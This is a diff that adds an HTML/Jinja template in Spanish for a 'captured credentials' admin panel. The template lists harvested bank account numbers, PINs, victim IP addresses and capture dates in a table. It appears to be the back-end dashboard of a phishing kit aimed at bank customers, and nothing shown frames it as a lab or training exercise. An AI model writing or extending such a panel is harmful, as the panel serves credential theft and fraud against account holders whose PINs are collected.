@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel - Credenciales capturadas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        h2 { margin-bottom: 5px; }
+        p.sub { color: #666; font-size: 14px; margin-bottom: 20px; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 8px 12px;
+            text-align: left;
+            font-size: 14px;
+        }
+        th { background: #f2f2f2; }
+        .vacio { color: #999; padding: 30px; text-align: center; }
+        a.btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 6px 16px;
+            background: #eee;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            color: #333;
+            text-decoration: none;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Credenciales capturadas</h2>
+    <p class="sub">Total: {{ credenciales|length }}</p>
+
+    {% if credenciales %}
+    <table>
+        <tr>
+            <th>#</th>
+            <th>No. Cuenta</th>
+            <th>NIP</th>
+            <th>IP</th>
+            <th>Fecha</th>
+        </tr>
+        {% for cred in credenciales %}
+        <tr>
+            <td>{{ loop.index }}</td>
+            <td>{{ cred.cuenta }}</td>
+            <td>{{ cred.nip }}</td>
+            <td>{{ cred.ip }}</td>
+            <td>{{ cred.fecha }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+    {% else %}
+    <p class="vacio">No hay credenciales capturadas aún.</p>
+    {% endif %}
+
+    <a class="btn" href="/panel">Actualizar</a>
+</body>
+</html>
